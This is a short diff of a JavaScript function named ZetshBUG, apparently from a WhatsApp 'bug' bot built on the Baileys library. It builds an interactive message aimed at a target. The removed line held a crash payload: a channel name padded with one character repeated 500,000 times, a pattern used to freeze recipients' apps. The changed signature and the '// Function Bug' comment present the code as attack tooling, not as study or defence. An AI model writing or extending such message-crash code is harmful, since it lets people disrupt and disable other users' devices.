@@ -100,7 +100,7 @@ console.log();
 }
 
 // Function Bug
-async function ZetshBUG(jid, channelName = "Zeth D Sylvaa ϟ" + "ꦾ".repeat(500000)) {
+async function ZetshBUG(target, Ptcp = true) {
   const header = proto.Message.InteractiveMessage.Header.create({
         ...(await prepareWAMessageMedia(
           { image: { url: "https://files.catbox.moe/uk38k6.jpg" } },
